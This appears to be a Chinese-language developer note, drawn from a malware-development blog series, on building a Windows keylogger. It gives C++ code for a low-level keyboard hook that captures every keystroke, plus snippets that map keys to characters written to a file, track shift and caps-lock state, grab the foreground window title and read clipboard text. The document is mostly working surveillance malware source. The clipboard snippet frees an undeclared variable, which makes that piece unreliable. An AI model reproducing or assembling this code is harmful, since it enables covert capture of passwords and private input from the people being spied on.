# 按键记录

keywords: 键盘记录器 keylogger  

```cpp
#include <Windows.h>
#include <stdio.h>

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
	int msg = 1 + (kbdStruct.scanCode << 16) + (kbdStruct.flags << 24);
	char keyName[64];
	GetKeyNameTextA(msg, keyName, 64);
	char keyState[16];
	switch (wParam)
	{
	case WM_KEYUP:
		strncpy_s(keyState, "Key Up\0", 16);
		break;
	case WM_KEYDOWN:
		strncpy_s(keyState, "Key Down\0", 16);
		break;
	case WM_SYSKEYUP:
		strncpy_s(keyState, "Sys Key Up\0", 16);
		break;
	case WM_SYSKEYDOWN:
		strncpy_s(keyState, "Sys Key Down\0", 16);
		break;
	}
	printf("Captured: %s \t %s\n", keyName, keyState);
	return CallNextHookEx(0, nCode, wParam, lParam);
}

int main()
{
	SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
	while (GetMessageA(0, 0, 0, 0));
}
```

---
`GetKeyNameTextA`对一些按键不会返回名称，如：右SHIFT会返回空字符串，所以建议根据映射表手动映射： 
```cpp
KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
switch (kbdStruct.vkCode)
{
	case VK_BACK:
		fprintf(fp, "BACKSPACE ");
		break;
	...
	case 0x4F:
		if (capLetter) { fprintf(fp, "O "); }
		else { fprintf(fp, "o "); }
		break;
	...
	default:
		fprintf(fp, "[UNKNOWN]%04x ", kbdStruct.vkCode);
		break;
}
```
https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes  


---
获取一些按键状态：  
```cpp
// GetKeyState 返回值类型为 SHORT，2个字节，最高位表示按键是否被按下
bool shiftPress = GetKeyState(VK_SHIFT) & 0x8000;
// 最低位表示当前状态
bool capsLock = GetKeyState(VK_CAPITAL) & 0x1;
bool numLock = GetKeyState(VK_NUMLOCK) & 0x1;
// 大写状态，简洁的异或，相当于 (capsLock && !shiftPress) || (!capsLock && shiftPress)
bool capLetter = capsLock ^ shiftPress;
```
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate  


---
获取当前窗口标题：  
```cpp
HWND curForeWindow = GetForegroundWindow();
char curForeWindowText[264] = { 0 };
GetWindowTextA(curForeWindow, curForeWindowText, 260);
```


---
获取剪贴板文本内容：  
```cpp
if (IsClipboardFormatAvailable(CF_TEXT))
{
	OpenClipboard(NULL);
	HANDLE cbHandle = GetClipboardData(CF_TEXT);
	printf("[c]%s[c] ", cbHandle);

	free(encodedData);

	CloseClipboard();
}
```


---
原链接: https://0xpat.github.io/Malware_development_part_7/  


2021/4/21  
